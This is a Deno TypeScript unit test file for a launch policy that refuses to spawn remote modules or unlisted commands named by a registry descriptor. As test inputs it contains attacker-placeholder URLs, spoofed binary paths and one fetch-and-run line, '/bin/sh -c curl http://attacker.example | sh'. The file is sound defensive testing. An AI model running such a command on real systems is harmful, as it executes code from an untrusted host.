// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * Unit: {@link launchDenial} — the policy deciding whether a registry
 * descriptor's launch location may be spawned. The registry server runs what
 * the registry tells it to, so a descriptor pointing at a remote entry module is
 * a remote code-execution primitive unless the operator named its origin.
 */

import { assertEquals } from "./_assert.ts";
import {
  LAUNCH_COMMANDS_ENV,
  LAUNCH_HOSTS_ENV,
  launchDenial,
} from "../src/registry/launch_policy.ts";
import { ALLOW_INSECURE_ENV } from "../src/http.ts";
import type { BuildLocation } from "../src/registry/descriptor.ts";

/** Build a `readEnv` over a plain record. */
function env(
  vars: Record<string, string> = {},
): (name: string) => string | undefined {
  return (name) => vars[name];
}

/** A module-kind location for `module`. */
function moduleAt(module: string): BuildLocation {
  return { kind: "module", module, cwd: "/work" };
}

/** A command-kind location for `command`. */
function commandOf(...command: string[]): BuildLocation {
  return { kind: "command", command, cwd: "/work" };
}

Deno.test("a local entry module is always allowed", () => {
  for (
    const module of [
      "file:///srv/app/zuke.ts", // what `zuke register` writes (Deno.mainModule)
      "/srv/app/zuke.ts",
      "./zuke.ts",
      "zuke.ts",
      "C:\\src\\app\\zuke.ts",
      "c:/src/app/zuke.ts",
    ]
  ) {
    assertEquals(launchDenial(moduleAt(module), env()), null, module);
  }
});

Deno.test("a remote entry module is refused unless its origin is allow-listed", () => {
  const denial = launchDenial(
    moduleAt("https://attacker.example/x.ts"),
    env(),
  );
  assertEquals(denial?.reason, "launch_origin_not_allowed");
  assertEquals(denial?.detail.includes("attacker.example"), true);
  assertEquals(denial?.detail.includes(LAUNCH_HOSTS_ENV), true);

  assertEquals(
    launchDenial(
      moduleAt("https://builds.example.com/zuke.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
    ),
    null,
  );
  // A list, with either separator, and matched case-insensitively.
  assertEquals(
    launchDenial(
      moduleAt("https://Builds.Example.com/zuke.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "a.example, builds.example.com  b.example" }),
    ),
    null,
  );
  // Allow-listing one host does not admit another.
  assertEquals(
    launchDenial(
      moduleAt("https://attacker.example/x.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
    )?.reason,
    "launch_origin_not_allowed",
  );
  // A suffix of an allow-listed host is a different host.
  assertEquals(
    launchDenial(
      moduleAt("https://evil-builds.example.com/x.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
    )?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("a wildcard allow-list admits any origin", () => {
  assertEquals(
    launchDenial(
      moduleAt("https://anywhere.example/x.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "*" }),
    ),
    null,
  );
});

Deno.test("a remote specifier with no hostname is named by its scheme", () => {
  // `deno run jsr:@scope/build` fetches and executes code just as an https URL
  // does, but has no hostname — so the scheme is what an operator allow-lists.
  assertEquals(
    launchDenial(moduleAt("jsr:@scope/build"), env())?.reason,
    "launch_origin_not_allowed",
  );
  assertEquals(
    launchDenial(
      moduleAt("jsr:@scope/build"),
      env({ [LAUNCH_HOSTS_ENV]: "jsr:" }),
    ),
    null,
  );
  assertEquals(
    launchDenial(moduleAt("npm:some-build"), env())?.reason,
    "launch_origin_not_allowed",
  );
  assertEquals(
    launchDenial(moduleAt("data:text/plain,console.log(1)"), env())?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("an allow-listed plaintext origin still needs the insecure opt-out", () => {
  const allowed = env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" });
  const denial = launchDenial(
    moduleAt("http://builds.example.com/zuke.ts"),
    allowed,
  );
  assertEquals(denial?.reason, "insecure_launch_url");
  assertEquals(denial?.detail.includes(ALLOW_INSECURE_ENV), true);

  assertEquals(
    launchDenial(
      moduleAt("http://builds.example.com/zuke.ts"),
      env({
        [LAUNCH_HOSTS_ENV]: "builds.example.com",
        [ALLOW_INSECURE_ENV]: "1",
      }),
    ),
    null,
  );
  // Loopback needs no opt-out — there is no path to sit on — but it is still
  // remote code, so it is still allow-listed.
  assertEquals(
    launchDenial(
      moduleAt("http://localhost:8000/zuke.ts"),
      env({ [LAUNCH_HOSTS_ENV]: "localhost" }),
    ),
    null,
  );
  assertEquals(
    launchDenial(moduleAt("http://localhost:8000/zuke.ts"), env())?.reason,
    "launch_origin_not_allowed",
  );
});

Deno.test("a command location is refused unless its program is allow-listed", () => {
  // The registry writer chooses the program *and* its arguments, so a command
  // descriptor is code execution on a registry's say-so — the same threat the
  // module gate refuses, spelled without a fetch.
  const denial = launchDenial(commandOf("./zuke", "--"), env());
  assertEquals(denial?.reason, "launch_command_not_allowed");
  assertEquals(denial?.detail.includes(LAUNCH_COMMANDS_ENV), true);
  assertEquals(denial?.detail.includes("./zuke"), true);

  assertEquals(
    launchDenial(
      commandOf("./zuke", "--"),
      env({ [LAUNCH_COMMANDS_ENV]: "./zuke" }),
    ),
    null,
  );
});

Deno.test("the command allow-list matches the program exactly", () => {
  // An entry admits the exact string the descriptor wrote, and nothing else.
  assertEquals(
    launchDenial(
      commandOf("make", "release"),
      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
    ),
    null,
  );
  assertEquals(
    launchDenial(
      commandOf("/usr/bin/make", "release"),
      env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
    ),
    null,
  );
  // Case folds, because Windows program names do.
  assertEquals(
    launchDenial(
      commandOf("MAKE"),
      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
    ),
    null,
  );
});

Deno.test("a bare allow-list entry does not admit a same-named file elsewhere", () => {
  // The descriptor chooses the program string *and* the working directory a
  // relative one resolves against. Matching by basename would therefore let a
  // registry writer point the operator's trusted `make` at a file of their own
  // — so `make` admits the bare name the OS resolves on PATH, and nothing else.
  const allowed = env({ [LAUNCH_COMMANDS_ENV]: "make" });
  for (
    const program of [
      "/tmp/attacker/make",
      "./make",
      "../make",
      ".//make",
      "C:\\attacker\\make",
      "attacker/make",
    ]
  ) {
    assertEquals(
      launchDenial(commandOf(program, "release"), allowed)?.reason,
      "launch_command_not_allowed",
      `${program} must not be admitted by the bare entry "make"`,
    );
  }
  // The converse: an absolute entry does not admit the bare name either.
  assertEquals(
    launchDenial(
      commandOf("make"),
      env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
    )
      ?.reason,
    "launch_command_not_allowed",
  );
});

Deno.test("a program that trims to nothing is never admitted", () => {
  // `allowList` drops empty entries, so no list can hold "" — but a program of
  // whitespace must be refused on its own account, not by that coincidence.
  for (const program of [" ", "\t", "\u00a0", "\u200b"]) {
    assertEquals(
      launchDenial(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "make" }))
        ?.reason,
      "launch_command_not_allowed",
    );
    assertEquals(
      launchDenial(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "" }))
        ?.reason,
      "launch_command_not_allowed",
    );
  }
});

Deno.test("the command allow-list is comma-separated, so a path may contain spaces", () => {
  // Trimmed, newline-tolerant, and separated on commas rather than whitespace —
  // a hostname never contains a space but a program path routinely does.
  for (
    const raw of [
      "make, deploy.sh",
      "make\ndeploy.sh",
      " make ,,deploy.sh ",
    ]
  ) {
    assertEquals(
      launchDenial(commandOf("deploy.sh"), env({ [LAUNCH_COMMANDS_ENV]: raw })),
      null,
    );
  }
  assertEquals(
    launchDenial(
      commandOf("C:\\Program Files\\make.EXE"),
      env({ [LAUNCH_COMMANDS_ENV]: "make, c:\\program files\\make.exe" }),
    ),
    null,
  );
  assertEquals(
    launchDenial(
      commandOf("/bin/sh", "-c", "curl http://attacker.example | sh"),
      env({ [LAUNCH_COMMANDS_ENV]: "*" }),
    ),
    null,
  );
  // An unrelated entry does not admit it.
  assertEquals(
    launchDenial(
      commandOf("/bin/sh", "-c", "id"),
      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
    )
      ?.reason,
    "launch_command_not_allowed",
  );
});

Deno.test("an empty command is left for the caller to report", () => {
  // The server answers "no runnable launch command", which says more than a
  // policy denial would; the gate must not turn that into a refusal.
  assertEquals(launchDenial(commandOf(), env()), null);
  assertEquals(launchDenial(commandOf(""), env()), null);
});

Deno.test("the host allow-list does not admit a command program", () => {
  // The two lists are separate decisions: trusting an origin to serve a module
  // is not trusting a registry to name a program and its arguments.
  assertEquals(
    launchDenial(
      commandOf("make"),
      env({ [LAUNCH_HOSTS_ENV]: "*" }),
    )?.reason,
    "launch_command_not_allowed",
  );
});
